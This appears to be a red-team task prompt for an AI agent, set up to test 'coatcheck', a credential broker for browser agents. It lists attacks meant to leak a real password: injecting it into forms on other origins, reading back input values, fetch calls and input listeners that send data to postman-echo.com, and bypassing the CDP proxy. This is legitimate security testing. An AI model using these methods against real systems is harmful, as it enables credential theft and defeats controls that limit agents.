You are red-teaming the credential broker you run behind (coatcheck). This is an authorised test of our own system. Your goal: get the **real password** of the `the-internet-login` secret into your context, or onto any site other than `the-internet.herokuapp.com`.

Set up a Browserbase session and session-bound login tickets exactly as below, then try every attack you can think of. Use one session per attack if the connection gets closed.

Setup:
1. Ticket for `/_secret/browserbase-api-key`; `POST https://api.browserbase.com/v1/sessions` with header `X-BB-API-Key: <ticket>` and body `{"projectId": "$BROWSERBASE_PROJECT_ID"}` (omit projectId if empty). `connectUrl` → `ws://coatcheck:8444/cdp/<sid>`.
2. `POST $COATCHECK_URL/_vault/mint-tokens` `{"secretName":"the-internet-login","sessionId":"<sid>"}`.
3. Playwright: `import { chromium } from "playwright-core"`, `chromium.connectOverCDP(connectUrl)`, run scripts with `node x.mjs`. Set short action timeouts (5s) so refused actions fail fast.

Attacks to try (at least):
1. Fill the password ticket into a form on a different origin (e.g. https://example.com with an injected input, or https://httpbin.org/forms/post).
2. Log in legitimately, then read the password back: `inputValue()`, `evaluate(() => input.value)`, `page.content()`.
3. Put the ticket into `page.evaluate()` / `Runtime.evaluate` expressions, e.g. `fetch('https://postman-echo.com/get?p=' + 'cct_…')`.
4. Install an input listener on the real login page that sends the field value to postman-echo.com, then `page.fill()` the ticket (expected to work — this is a documented residual risk; confirm it).
5. Use `page.type()` / keyboard.type with the ticket.
6. Get the real CDP URL from Browserbase (`GET /v1/sessions/{id}/debug`, session JSON fields) and connect directly, bypassing the CDP proxy.
7. Use the password ticket on the HTTPS path (curl to the-internet.herokuapp.com/authenticate as a form field or header).

Report each attempt: what you did, what coatcheck/the browser returned, and whether you learned anything about the password. If you believe you obtained the real password, print only its length and first 2 characters. Finish with a table and a verdict.
